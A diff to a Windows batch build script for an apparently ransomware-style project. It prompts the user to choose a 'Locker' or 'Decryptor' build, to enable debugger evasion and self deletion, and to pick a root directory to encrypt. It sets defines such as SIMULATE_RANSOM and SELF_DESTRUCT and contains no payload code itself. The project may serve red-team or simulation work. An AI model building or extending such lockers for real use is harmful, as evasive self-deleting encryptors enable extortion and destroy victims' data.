@@ -11,17 +11,35 @@ echo.
 echo === %PROJ% Build (%CFG%^|%PLAT%) ===
 echo.
 
-set /p EXE=Build which? (Locker/Decryptor): 
-set /p CON=Subsystem? (Console/Windows): 
-set /p DBG=Enable debugger evasion? (Y/N): 
-set /p SD=Enable self deletion? (Y/N): 
-set /p DIR=Start from which directory? (Leave blank for current directory): 
+REM --- toolchain ---
+choice /C ML /N /M "Toolchain: [M]SVC or [L]LVM? "
+if errorlevel 2 ( set "TOOLSET=ClangCL" ) else ( set "TOOLSET=v143" )
 
-REM --- write override.h ---
+REM --- executable ---
+choice /c LD /N /M "Executable: [L]ocker or [D]ecryptor? "
+if errorlevel 2 ( set "EXE=Decryptor" ) else ( set "EXE=Locker" )    
+
+REM --- subsystem ---
+choice /c CW /N /M "SubSystem: [C]onsole or [W]indows? "
+if errorlevel 2 ( set "SUB=Windows" ) else ( set "SUB=Console" )     
+
+REM --- debugger evasion ---
+choice /c YN /N /M "Enable Debugger Evasion: [Y]es or [N]o? "
+if errorlevel 2 ( set "DBG=No" ) else ( set "DBG=Yes" )
+
+REM --- self deletion ---
+choice /c YN /N /M "Enable Self Deletion: [Y]es or [N]o? "
+if errorlevel 2 ( set "DEL=No" ) else ( set "DEL=Yes" )
+
+REM --- root directory ---
+set /p DIR=Root directory for encryption/decryption [Enter = current]: 
+
+REM --- override.h ---
+echo.
 if "%DIR%"=="" (
   (
     echo #pragma once
-    echo // no override; using GetCurrentDirectory fallback
+    echo // No CONFIG_ROOT_DIR override; using GetCurrentDirectory at runtime.
   ) > "%OVR%"
 ) else (
   set "DIR_ESC=%DIR:\=\\%"
@@ -32,30 +50,23 @@ if "%DIR%"=="" (
   ) > "%OVR%"
 )
 
-REM --- CL flags ---
+REM --- CL arguments ---
 set "CL_ARGS="
-if /I "%CON%"=="Console" ( set "CL_ARGS=!CL_ARGS! /DCONSOLE_STDOUT" ) else ( set "CL_ARGS=!CL_ARGS! /UCONSOLE_STDOUT" )
-if /I "%DBG%"=="Y"  set "CL_ARGS=!CL_ARGS! /DDBG_EVASION"
-if /I "%SD%"=="Y"   set "CL_ARGS=!CL_ARGS! /DSELF_DESTRUCT"
+if /I "%SUB%"=="Console" ( set "CL_ARGS=!CL_ARGS! /DCONSOLE_STDOUT" ) else ( set "CL_ARGS=!CL_ARGS! /UCONSOLE_STDOUT" )
+if /I "%DBG%"=="Yes"  set "CL_ARGS=!CL_ARGS! /DDBG_EVASION"
+if /I "%DEL%"=="Yes"  set "CL_ARGS=!CL_ARGS! /DSELF_DESTRUCT"
 if /I "%EXE%"=="Decryptor" ( set "CL_ARGS=!CL_ARGS! /DBUILD_DECRYPTOR /USIMULATE_RANSOM" ) else ( set "CL_ARGS=!CL_ARGS! /DSIMULATE_RANSOM" )
 
-REM --- subsystem ---
-if /I "%CON%"=="Console" ( set "SUBSYSTEM=Console" ) else ( set "SUBSYSTEM=Windows" )
-
-echo.
-echo Using:
-echo   Root     = %DIR%
-echo   Override = %OVR%
-type "%OVR%"
-echo   CL       = !CL_ARGS!
-echo   SubSystem= !SUBSYSTEM!
-echo.
-
-REM --- build ---
+REM --- CL command ---
 set "CL_SAVED=%CL%"
-set "CL=!CL_ARGS! %CL_SAVED%"
+if /I "%TOOLSET%"=="ClangCL" (
+  set "CL=!CL_ARGS! /clang:-mrdrnd %CL_SAVED%"
+) else (
+  set "CL=!CL_ARGS! %CL_SAVED%"
+)
 
-msbuild "%PROJ%.sln" /m /t:Rebuild /p:Configuration=%CFG%;Platform=%PLAT%;SubSystem=!SUBSYSTEM! /nologo
+REM --- msbuild ---
+msbuild "%PROJ%.sln" /m /t:Rebuild /p:Configuration=%CFG%;Platform=%PLAT%;SubSystem=!SUB!;PlatformToolset=!TOOLSET! /nologo
 
 set "ERR=%ERRORLEVEL%"
 set "CL=%CL_SAVED%"
